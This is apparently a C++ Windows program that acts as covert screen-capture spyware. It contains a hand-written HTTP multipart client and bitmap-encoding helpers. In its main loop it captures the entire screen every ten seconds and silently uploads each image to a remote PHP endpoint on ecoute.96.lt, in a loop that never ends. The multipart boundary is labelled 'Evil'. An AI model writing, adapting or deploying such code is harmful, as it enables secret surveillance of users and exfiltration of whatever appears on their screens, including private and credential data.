#include <winsock2.h>
#include <vector>
#include <string>
#include <iostream>
#include <sstream>
#include <windows.h>
#include <ctime>
//#include <stdio.h>
#undef UNICODE
#define errhandler(a,b) throw a
using namespace std;
struct SocketInitializer
{
    SocketInitializer()
    {
        WSADATA init;
        WSAStartup(MAKEWORD(2, 2), &init);
    }
    ~SocketInitializer()
    {
        WSACleanup();
    }
};
SocketInitializer globalInitializer;
string BOUNDARY("----------Evil_B0uNd4Ry_$");
string CRLF("\r\n");
template<typename T>string to_string(T a){
stringstream i;
i<<a;
return i.str();}
class Socky
{
protected:
    SOCKET Socket;
    SOCKADDR_IN SockAddr = {0};
    struct hostent *host;
    string m_method;
    string m_host;
    string m_header;
    vector<string> m_body;
    string reponse;
public:
    Socky()
    {
        int success = 0;
        do
        {
            try
            {
                Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);//IPPROTO_TCP au lieu de 0
                if(Socket == INVALID_SOCKET)
                {
                    Sleep(5000);
                    throw 1;
                }
            }
            catch(int e)
            {
                success = e;
            }
        }
        while(success != 0);
    }
    Socky(const char * hostname)
    {
        Socky();
        init(hostname);
    }
    void init(const char* hostname)
    {
        Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        int success = 0;host=NULL;
        do
        {
            try
            {

                host = gethostbyname(hostname);
                if(host==NULL)
                {
                    cout<<"err";
                    Sleep(5000);
                    throw 1;
                }
            }
            catch(int e)
            {
                success = e;
            }
        }
        while(success != 0);
        SockAddr.sin_port = htons(80);
        SockAddr.sin_family = AF_INET;
        SockAddr.sin_addr.s_addr = *((unsigned long*)host->h_addr);

    }
    string genBody()
    {
        string body;
        if(m_body.size()!=0)
        {
            body +=CRLF;
            stringstream l;
            for(unsigned int i=0; i<m_body.size(); i++)
            {
                body.append("--" + BOUNDARY + CRLF);
                body+=m_body[i];
                if(i!=m_body.size()-1)body.append("--" + BOUNDARY + CRLF);
                else body.append("--" + BOUNDARY + "--" + CRLF);
            }
            //l.push_back(13);
            l<<body.length();
            addHeader("Content-Length",l.str().c_str());
            string c=string("multipart/form-data; boundary=")+BOUNDARY;
            addHeader(string("Content-Type"),c);


        }
        return body;
    }
    string sendReq()
    {
        string b=genBody();
        string requete = m_method + m_host + m_header +b+ CRLF;
        //cout.write(requete.c_str(),requete.size())<<"fin"<<requete.size();
        if(connect(Socket, (SOCKADDR*)(&SockAddr), sizeof(SockAddr)) != 0)
        {
        }
        if(send(Socket, requete.c_str(), requete.length(), 0) < 0)
        {
        }
        char buffer[512] = {0};
        int n = 0;
        while((n = recv(Socket, buffer, 512, 0)) > 0)
        {
            int i = 0;
            while(buffer[i] >= 32 || buffer[i] == '\n' || buffer[i] == '\r')
            {
                reponse += buffer[i];
                i += 1;
            }
        }
        closesocket(Socket);
        //Socky nouveau;
        cout<<reponse;
        return reponse;
    }
    Socky& setMethod(string method)
    {
        this->m_method = method + CRLF;
        return *this;
    }
    Socky& setHost(string host)
    {
        this->m_host = host + CRLF;
        return *this;
    }
    Socky& addHeader(string header, string value)
    {
        this->m_header += header + string(": ") + value + CRLF;
        return *this;
    }

    Socky& addFile(string name, string value, string filename="", string type="text/plain")
    {
        string body;
        //body.append("--" + BOUNDARY + CRLF);

        if (filename!=string(""))
        {
            body.append("Content-Disposition: form-data; name=\"" + name + "[]\"");
            body.append("; filename=\"" + filename + "\"" + CRLF);
            body.append("Content-Type: "+type + CRLF);
        }
        else {body.append("Content-Disposition: form-data; name=\"" + name + "\"");body.append(CRLF);}
        body.append(CRLF);
        body.append(value + CRLF);
        //body.append("--" + BOUNDARY + "--" + CRLF);
        //body.append(CRLF);
        this->m_body.push_back(body);
        return *this;
    }
};

PBITMAPINFO CreateBitmapInfoStruct(HBITMAP hBmp)
{
    BITMAP bmp;
    PBITMAPINFO pbmi;
    WORD    cClrBits;
    // Retrieve the bitmap color format, width, and height.
    if(!GetObject(hBmp, sizeof(BITMAP), (LPSTR)&bmp))
        errhandler("GetObject", hwnd);
    // Convert the color format to a count of bits.
    cClrBits = (WORD)(bmp.bmPlanes * bmp.bmBitsPixel);
    if(cClrBits == 1)
        cClrBits = 1;
    else if(cClrBits <= 4)
        cClrBits = 4;
    else if(cClrBits <= 8)
        cClrBits = 8;
    else if(cClrBits <= 16)
        cClrBits = 16;
    else if(cClrBits <= 24)
        cClrBits = 24;
    else cClrBits = 32;
    // Allocate memory for the BITMAPINFO structure. (This structure
    // contains a BITMAPINFOHEADER structure and an array of RGBQUAD
    // data structures.)
    if(cClrBits < 24)
        pbmi = (PBITMAPINFO) LocalAlloc(LPTR,
                                        sizeof(BITMAPINFOHEADER) +
                                        sizeof(RGBQUAD) * (1 << cClrBits));
    // There is no RGBQUAD array for these formats: 24-bit-per-pixel or 32-bit-per-pixel
    else
        pbmi = (PBITMAPINFO) LocalAlloc(LPTR,
                                        sizeof(BITMAPINFOHEADER));
    // Initialize the fields in the BITMAPINFO structure.
    pbmi->bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    pbmi->bmiHeader.biWidth = bmp.bmWidth;
    pbmi->bmiHeader.biHeight = bmp.bmHeight;
    pbmi->bmiHeader.biPlanes = bmp.bmPlanes;
    pbmi->bmiHeader.biBitCount = bmp.bmBitsPixel;
    if(cClrBits < 24)
        pbmi->bmiHeader.biClrUsed = (1 << cClrBits);
    // If the bitmap is not compressed, set the BI_RGB flag.
    pbmi->bmiHeader.biCompression = BI_RGB;
    // Compute the number of bytes in the array of color
    // indices and store the result in biSizeImage.
    // The width must be DWORD aligned unless the bitmap is RLE
    // compressed.
    pbmi->bmiHeader.biSizeImage = ((pbmi->bmiHeader.biWidth * cClrBits + 31) & ~31) / 8
                                  * pbmi->bmiHeader.biHeight;
    // Set biClrImportant to 0, indicating that all of the
    // device colors are important.
    pbmi->bmiHeader.biClrImportant = 0;
    return pbmi;
}
string CreateBMPFile2( PBITMAPINFO pbi,
                   HBITMAP hBMP, HDC hDC)
{

    BITMAPFILEHEADER hdr;       // bitmap file-header
    PBITMAPINFOHEADER pbih;     // bitmap info-header
    LPBYTE lpBits;              // memory pointer
    DWORD dwTotal;              // total count of bytes
    DWORD cb;                   // incremental count of bytes
    BYTE *hp;                   // byte pointer
    DWORD dwTmp;
        pbih = (PBITMAPINFOHEADER) pbi;
    lpBits = (LPBYTE) malloc( pbih->biSizeImage);//lpBits = (LPBYTE) GlobalAlloc(GMEM_FIXED, pbih->biSizeImage);
    if(!lpBits) errhandler("malloc", hwnd);
    // Retrieve the color table (RGBQUAD array) and the bits
    // (array of palette indices) from the DIB.
    if(!GetDIBits(hDC, hBMP, 0, (WORD) pbih->biHeight, lpBits, pbi, DIB_RGB_COLORS)) errhandler("GetDIBits", hwnd);
    string f;
        hdr.bfType = 0x4d42;        // 0x42 = "B" 0x4d = "M"
    // Compute the size of the entire file.
    hdr.bfSize = (DWORD)(sizeof(BITMAPFILEHEADER) + pbih->biSize + pbih->biClrUsed * sizeof(RGBQUAD) + pbih->biSizeImage);
    hdr.bfReserved1 = 0;
    hdr.bfReserved2 = 0;
    // Compute the offset to the array of color indices.
    hdr.bfOffBits = (DWORD) sizeof(BITMAPFILEHEADER) + pbih->biSize + pbih->biClrUsed * sizeof(RGBQUAD);
    f.append(reinterpret_cast<char *>(&hdr),sizeof(BITMAPFILEHEADER));
    f.append(reinterpret_cast<char *>(pbih),sizeof(BITMAPINFOHEADER) + pbih->biClrUsed * sizeof(RGBQUAD));
        dwTotal = cb = pbih->biSizeImage;
    hp = lpBits;
    f.append(reinterpret_cast<char *>(hp),(int) cb);
    free((HGLOBAL)lpBits);
    return f;
}
string id=to_string(time(NULL));
void GetScreenShot()
{
    int x1  = GetSystemMetrics(SM_XVIRTUALSCREEN),
        y1  = GetSystemMetrics(SM_YVIRTUALSCREEN),
        x2  = GetSystemMetrics(SM_CXVIRTUALSCREEN),
        y2  = GetSystemMetrics(SM_CYVIRTUALSCREEN),
        w   = x2 - x1,
        h   = y2 - y1;
    // copy screen to bitmap
    HDC     hScreen = GetDC(NULL);
    HDC     hDC     = CreateCompatibleDC(hScreen);
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, w, h);
    HGDIOBJ old_obj = SelectObject(hDC, hBitmap);
    BOOL    bRet    = BitBlt(hDC, 0, 0, w, h, hScreen, x1, y1, SRCCOPY);
    // save bitmap to clipboard
    PBITMAPINFO pbi = CreateBitmapInfoStruct(hBitmap);
    //CreateBMPFile("t2.bmp", pbi,hBitmap, GetDC(NULL));
    string im=
    CreateBMPFile2(pbi,hBitmap, GetDC(NULL));
    Socky socky("ecoute.96.lt");
    socky.setMethod("POST /socket.php HTTP/1.1").setHost(string("Host: ecoute.96.lt")).addFile("id",id)
    .addFile("test",im,to_string(time(NULL))+".bmp","image/x-windows-bmp").sendReq();
    // clean up
    SelectObject(hDC, old_obj);
    DeleteDC(hDC);
    ReleaseDC(NULL, hScreen);
    DeleteObject(hBitmap);
}
int main()
{

    int i=45;
    int *pi=&i;
    system("color f0");

while(1){
    GetScreenShot();
    Sleep(10000);
}
    Socky socky("ecoute.96.lt");
    cout << socky.setMethod("POST /socky.php HTTP/1.1").setHost(string("Host: ecoute.96.lt")).addFile("id",id).addFile("test",u8"si @&€tu vois ce fichier c'est que cela a marché","test.txt")
    /*.addFile("test",reinterpret_cast<char*>(pi),"testy.txt")*/.sendReq();
    /* socky.~Socky();
     socky=Socky("ecoute.96.lt");
     cout<<socky.setMethod("GET / HTTP/1.1").setHost(string("Host: www.example.com")).sendReq();*/
    return 0;
}
